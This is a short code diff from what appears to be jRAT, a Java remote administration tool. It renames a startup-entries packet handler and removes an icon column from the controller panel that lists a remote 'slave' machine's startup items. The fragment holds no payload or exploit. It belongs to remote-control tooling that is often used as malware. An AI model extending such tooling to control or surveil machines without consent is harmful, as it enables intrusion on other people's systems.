@@ -5,7 +5,7 @@ import jrat.controller.packets.incoming.IncomingPacket;
 import jrat.module.system.ui.PanelStartup;
 
 
-public class Packet53RegistryStartup implements IncomingPacket {
+public class Packet53Startup implements IncomingPacket {
 
 	@Override
 	public void read(Slave slave) throws Exception {
@@ -14,7 +14,7 @@ public class Packet53RegistryStartup implements IncomingPacket {
         PanelStartup panel = (PanelStartup) slave.getPanel(PanelStartup.class);
 
 		if (panel != null) {
-			panel.getModel().addRow(new Object[] { PanelStartup.ICON, path });
+			panel.getModel().addRow(new Object[] { path });
 		}
 	}
 
